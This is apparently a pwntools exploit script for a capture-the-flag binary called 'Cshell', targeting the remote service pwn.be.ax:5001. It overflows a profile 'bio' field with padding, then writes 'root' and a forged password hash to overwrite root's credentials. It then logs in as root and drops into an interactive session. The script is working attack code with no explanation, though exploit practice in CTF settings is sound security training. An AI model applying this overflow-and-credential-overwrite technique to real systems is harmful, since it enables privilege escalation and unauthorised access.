#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('Cshell')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote('pwn.be.ax', 5001)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b"up to 8 characters long.")
io.sendline(b"dr0wif")

io.recvuntil(b"a password.")
io.sendline(b"password")

io.recvuntil(b"(200 max)?")
io.sendline(b"120")

io.recvuntil(b"bio.")
io.sendline(b"A"*179 + b"root\x00\x00\x00\x00" + b"13tuGn7XXnAgQ")

io.recvuntil(b"Choice >")
io.sendline(b"1")

io.recvuntil(b"Username:")
io.sendline(b"root")

io.recvuntil(b"Password:")
io.sendline(b"password")

io.recvuntil(b"Choice >")
io.sendline(b"3")

io.interactive()
